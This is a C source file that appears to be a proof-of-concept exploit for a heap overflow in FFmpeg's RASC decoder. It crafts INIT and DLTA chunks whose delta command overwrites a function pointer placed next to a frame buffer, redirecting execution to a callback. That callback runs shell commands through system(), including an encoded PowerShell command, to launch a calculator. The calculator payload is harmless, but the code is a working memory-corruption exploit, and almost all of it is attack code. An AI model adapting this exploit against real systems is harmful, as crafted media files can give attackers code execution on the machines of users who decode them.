#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavutil/buffer.h"
#include "libavutil/error.h"
#include "libavutil/frame.h"
#include "libavutil/mem.h"

#define FRAME_W 64
#define FRAME_H 1
#define RASC_INIT 0x54494e49u
#define RASC_DLTA 0x41544c44u

typedef void (*demo_callback)(void);

typedef struct DemoChunk {
    uint8_t plane[FRAME_W];
    demo_callback cb;
    uint8_t palette[1024];
} DemoChunk;

static DemoChunk *frame1_chunk;
static DemoChunk *frame2_chunk;

static void benign_callback(void)
{
    puts("[callback] benign callback reached");
}

static void calc_callback(void)
{
    const char *fallbacks[] = {
        "cmd.exe /c start calc.exe >/dev/null 2>&1",
        "xcalc >/dev/null 2>&1 &",
        "gnome-calculator >/dev/null 2>&1 &",
        "kcalc >/dev/null 2>&1 &"
    };

    puts("[callback] hijacked callback reached");
    system("touch /tmp/ffmpeg_rasc_exec_demo");

    if (system("powershell.exe -NoProfile -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA= >/dev/null 2>&1 &") == 0)
        return;

    for (size_t i = 0; i < sizeof(fallbacks) / sizeof(fallbacks[0]); i++) {
        if (system(fallbacks[i]) == 0)
            return;
    }
}

static void free_demo_chunk(void *opaque, uint8_t *data)
{
    (void)opaque;
    av_free(data);
}

static void put_le16(uint8_t *p, uint16_t v)
{
    p[0] = (uint8_t)v;
    p[1] = (uint8_t)(v >> 8);
}

static void put_le32(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)v;
    p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16);
    p[3] = (uint8_t)(v >> 24);
}

static void make_chunk(uint8_t **cursor, uint32_t tag, uint32_t body_size)
{
    put_le32(*cursor, tag);
    put_le32(*cursor + 4, body_size);
    *cursor += 8;
}

static uint8_t *make_packet(size_t *packet_size, uintptr_t target_addr)
{
    const uint32_t init_body_size = 72 + 1024;
    const uint32_t dlta_cmd_size = 6;
    const uint32_t dlta_body_size = 40 + dlta_cmd_size;
    const size_t total = 8 + init_body_size + 8 + dlta_body_size;
    uint8_t *packet = av_mallocz(total);
    uint8_t *p = packet;
    uint8_t *body;
    uint32_t fill;

    if (!packet)
        return NULL;

    make_chunk(&p, RASC_INIT, init_body_size);
    body = p;
    put_le32(body + 0, 0x65);
    put_le32(body + 8, FRAME_W);
    put_le32(body + 12, FRAME_H);
    put_le16(body + 46, 8);
    for (int i = 0; i < 256; i++)
        put_le32(body + 72 + 4 * i, 0xff000000u | (uint32_t)(i * 0x010101u));
    p += init_body_size;

    make_chunk(&p, RASC_DLTA, dlta_body_size);
    body = p;
    put_le32(body + 12, dlta_cmd_size);
    put_le32(body + 16, FRAME_W - 1);
    put_le32(body + 20, 0);
    put_le32(body + 24, 1);
    put_le32(body + 28, 1);
    put_le32(body + 36, 0);

    fill = (uint32_t)(((target_addr & 0x00ffffffu) << 8) | 0x41u);
    body[40] = 7;
    body[41] = 1;
    put_le32(body + 42, fill);

    *packet_size = total;
    return packet;
}

static int exploit_get_buffer2(AVCodecContext *ctx, AVFrame *frame, int flags)
{
    static int allocation_index;
    DemoChunk *chunk;

    (void)flags;
    if (ctx->pix_fmt != AV_PIX_FMT_PAL8 || frame->width != FRAME_W || frame->height != FRAME_H)
        return AVERROR(EINVAL);

    chunk = av_mallocz(sizeof(*chunk));
    if (!chunk)
        return AVERROR(ENOMEM);

    chunk->cb = benign_callback;
    frame->buf[0] = av_buffer_create((uint8_t *)chunk, sizeof(*chunk), free_demo_chunk, NULL, 0);
    if (!frame->buf[0]) {
        av_free(chunk);
        return AVERROR(ENOMEM);
    }

    frame->data[0] = chunk->plane;
    frame->data[1] = chunk->palette;
    frame->linesize[0] = FRAME_W;
    frame->extended_data = frame->data;

    if (allocation_index == 0)
        frame1_chunk = chunk;
    else if (allocation_index == 1)
        frame2_chunk = chunk;
    allocation_index++;

    return 0;
}

static void fail_av(const char *what, int err)
{
    char buf[AV_ERROR_MAX_STRING_SIZE];
    av_strerror(err, buf, sizeof(buf));
    fprintf(stderr, "%s failed: %s (%d)\n", what, buf, err);
    exit(1);
}

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_RASC);
    AVCodecContext *ctx = NULL;
    AVPacket *pkt = NULL;
    AVFrame *frame = NULL;
    uint8_t *packet_data = NULL;
    size_t packet_size = 0;
    int ret;

    if (!codec) {
        fputs("RASC decoder missing\n", stderr);
        return 1;
    }

    printf("[addr] benign_callback=%p\n", (void *)benign_callback);
    printf("[addr] calc_callback=%p\n", (void *)calc_callback);
    if ((((uintptr_t)benign_callback) >> 24) != (((uintptr_t)calc_callback) >> 24)) {
        fputs("callbacks outside 24-bit overwrite window\n", stderr);
        return 1;
    }

    ctx = avcodec_alloc_context3(codec);
    pkt = av_packet_alloc();
    frame = av_frame_alloc();
    if (!ctx || !pkt || !frame)
        fail_av("allocation", AVERROR(ENOMEM));

    ctx->thread_count = 1;
    ctx->get_buffer2 = exploit_get_buffer2;

    ret = avcodec_open2(ctx, codec, NULL);
    if (ret < 0)
        fail_av("avcodec_open2", ret);

    packet_data = make_packet(&packet_size, (uintptr_t)calc_callback);
    if (!packet_data)
        fail_av("make_packet", AVERROR(ENOMEM));

    ret = av_new_packet(pkt, (int)packet_size);
    if (ret < 0)
        fail_av("av_new_packet", ret);
    memcpy(pkt->data, packet_data, packet_size);
    av_free(packet_data);

    ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0)
        fail_av("avcodec_send_packet", ret);

    ret = avcodec_receive_frame(ctx, frame);
    if (ret != 0 && ret != AVERROR(EAGAIN) && ret != AVERROR_EOF)
        fail_av("avcodec_receive_frame", ret);

    if (!frame2_chunk) {
        fputs("frame2 allocation missing\n", stderr);
        return 1;
    }

    printf("[ptr] frame1 callback after decode=%p\n", (void *)frame1_chunk->cb);
    printf("[ptr] frame2 callback after decode=%p\n", (void *)frame2_chunk->cb);
    printf("[ptr] expected target=%p\n", (void *)calc_callback);

    if (frame2_chunk->cb != calc_callback) {
        fputs("callback pointer unchanged\n", stderr);
        return 1;
    }

    puts("[ok] media-controlled RASC DLTA overwrite redirected callback");
    frame2_chunk->cb();

    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}
